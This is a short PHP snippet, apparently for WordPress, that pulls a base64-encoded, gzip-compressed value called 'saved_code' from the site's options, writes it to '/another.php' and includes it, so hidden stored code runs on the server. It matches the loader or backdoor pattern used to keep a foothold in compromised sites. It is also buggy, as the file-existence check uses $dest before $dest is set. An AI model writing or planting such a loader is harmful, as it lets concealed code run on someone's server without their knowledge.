<?php
if (!file_exists($dest)) {
    $contents = gzdecode(base64_decode(get_option('saved_code')));
    $dest = '/another.php';
    file_put_contents($dest, $contents);
}
include $dest;
